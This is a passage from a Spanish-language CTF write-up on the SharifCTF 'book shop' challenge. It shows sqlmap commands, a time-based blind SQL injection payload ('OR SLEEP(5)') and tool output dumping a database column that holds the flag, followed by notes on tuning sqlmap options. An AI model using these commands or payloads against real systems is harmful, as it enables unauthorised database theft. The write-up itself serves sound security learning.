++-------------+--------------+
+
+[00:28:24] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+
+[*] shutting down at 00:28:24
+
+
+-- Observamos que sqlmap ha descubierto 6 columnas.
+
+-- Nos interesa hacer el volcado completo de los datos la columna 'book_serial', ya que parece que
+   es donde se almacenan los números de serie de los libros y por tanto nuestra flag.
+
+
+----------------------------------------------------------------------------------------------------
+4.5) EXTRACCIÓN DE DATOS DE LA BASE DE DATOS
+
+Conocidos el nombre de la base de datos, la tabla de interés y la columna de interés, procedemos
+a la extracción de los datos:
+
+# sqlmap -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --prefix="\'" --cookie="PHPSESSID=iq4fsstg9fu7mng8migus9p6e6" --dbms=MySQL --risk=3 --columns -D book_shop -T books -C book_serial --dump
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.0.12#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 00:35:12
+
+[00:35:12] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: book_selection (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: book_selection=a\' OR SLEEP(5)-- hYMv
+---
+[00:35:13] [INFO] testing MySQL
+[00:35:13] [INFO] confirming MySQL
+[00:35:13] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+[00:35:13] [INFO] fetching columns 'book_serial' for table 'books' in database 'book_shop'
+[00:35:13] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+[00:35:21] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+1
+[00:35:51] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+[00:36:20] [INFO] adjusting time delay to 1 second due to good response times
+book_serial
+[00:37:50] [INFO] resumed: varchar(60)
+Database: book_shop
+Table: books
+[1 column]
++-------------+-------------+
+| Column      | Type        |
++-------------+-------------+
+| book_serial | varchar(60) |
++-------------+-------------+
+
+[00:37:50] [INFO] fetching entries of column(s) 'book_serial' for table 'books' in database 'book_shop'
+[00:37:50] [INFO] fetching number of column(s) 'book_serial' entries for table 'books' in database 'book_shop'
+[00:37:50] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+4
+[00:38:02] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
+123456
+[00:38:56] [INFO] retrieved: 239rj2if3r23re
+[00:41:05] [INFO] retrieved: 7890
+[00:41:42] [INFO] retrieved: SharifCTF{931b20ec7700a61e5d280888662757af}
+[00:47:41] [INFO] analyzing table dump for possible password hashes
+Database: book_shop
+Table: books
+[4 entries]
++---------------------------------------------+
+| book_serial                                 |
++---------------------------------------------+
+| 123456                                      |
+| 239rj2if3r23re                              |
+| 7890                                        |
+| SharifCTF{931b20ec7700a61e5d280888662757af} |
++---------------------------------------------+
+
+[00:47:41] [INFO] table 'book_shop.books' dumped to CSV file '/home/isma/.sqlmap/output/ctf.sharif.edu/dump/book_shop/books.csv'
+[00:47:41] [INFO] fetched data logged to text files under '/home/isma/.sqlmap/output/ctf.sharif.edu'
+
+[*] shutting down at 00:47:41
+
+
+-- La flag es: SharifCTF{931b20ec7700a61e5d280888662757af}
+
+
+Nota 1:
+
+La distinción entre una query que devuelve 'True' y otra que devuelve 'False' se suele realizar
+comparando el contenido de la página en la que se ha realizado la inyección con el contenido de
+la página original sin inyectar. Este concepto no siempre funciona, ya que a veces el contenido
+de las páginas puede cambiar dinámicamente (si la página tiene contadores, por ejemplo). Para 
+facilitar el proceso, el usuario puede especificar una cadena con --string, que debe estar presente
+en la página original y en todas las páginas que devuelven 'True' pero NO presente en las páginas
+que devuelven 'False'. En este ejemplo, la cadena 'covers' cumple con este requisito, por lo que
+podríamos haberlo especificado.
+
+Nota 2:
+
+Para acelerar el proceso y dado que en 4.1 descubrimos que la vulnerabilidad es el tipo 
+'AND/OR time-based blind', se puede especificar 'B' (blind) como técnica.
+
+# sqlmap -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --prefix="\'" --cookie="PHPSESSID=iq4fsstg9fu7mng8migus9p6e6" --technique B --dbms=MySQL --risk=3 --string covers --columns -D book_shop -T books -C book_serial --dump
+
+
+====================================================================================================
+EOF
+
